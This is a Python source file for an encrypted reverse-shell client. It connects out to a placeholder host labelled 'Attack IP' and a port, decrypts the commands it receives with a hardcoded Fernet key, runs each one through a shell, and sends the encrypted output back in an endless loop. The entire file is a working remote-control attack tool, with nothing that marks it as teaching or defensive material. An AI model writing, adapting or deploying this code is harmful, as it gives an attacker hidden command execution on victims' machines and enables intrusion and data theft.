import socket
import subprocess
from cryptography.fernet import Fernet

key = b'6wifEyjwf89CwkUweVRcBMxU7ywgba3ayNRAm_0Gq9E='

class Client(object):
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.connect((ip, port))

    def encrypt(self, msg,key):
        ferObject = Fernet(key)
        msgEncrypt = ferObject.encrypt(msg)
        return msgEncrypt

    def decrypt(self, msg,key):
        ferObject = Fernet(key)
        msgDecrypt = ferObject.decrypt(msg)
        return msgDecrypt

    def cmd(self, command):
        p = subprocess.Popen(command.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.stdout.read().decode(errors='replace').strip()

    def sendMsg(self, msg):
        msg = self.encrypt(msg,key)
        header = str(len(msg)).encode() #to send to the client the current length of the message
        self.server.send(header)
        self.server.send(msg) #sending the real message

    def readMsg(self):
        header = self.server.recv(5)
        msg = self.server.recv(int(header.decode()))
        return self.decrypt(msg,key).decode()

    def start(self):
        while True:
            command = self.readMsg()
            out = self.cmd(command)
            self.sendMsg(out.encode())

c = Client("Attack IP", PORT)
c.start()
